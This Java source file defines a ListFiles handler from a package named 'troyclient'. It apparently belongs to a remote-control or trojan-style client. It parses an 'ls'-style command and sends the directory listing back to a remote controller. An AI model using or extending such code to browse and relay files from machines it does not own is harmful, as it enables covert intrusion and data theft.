package ch.lebois.troyclient.service;

import ch.lebois.troyclient.functions.ListFilesFunction;
import ch.lebois.troyclient.main.GetContext;

/**
 * @author Felix
 * @date 13.03.2018
 * <p>
 * Project: Hermann
 * Package: ch.lebois.troyclient.service
 **/
public class ListFiles {
    public void listFiles(String command) {
        try {
            for (String s : ListFilesFunction.ls(command.substring(3))) {
                System.out.println(s);
                GetContext.SENDER.send("commandout", s);
            }
        } catch (StringIndexOutOfBoundsException e) {
            for (String s : ListFilesFunction.ls("")) {
                System.out.println(s);
                GetContext.SENDER.send("commandout", s);
            }
        } catch (NullPointerException e1) {
            GetContext.SENDER.send("errorout", "Wrong Syntax with '" + command + "'");
        }
    }


}
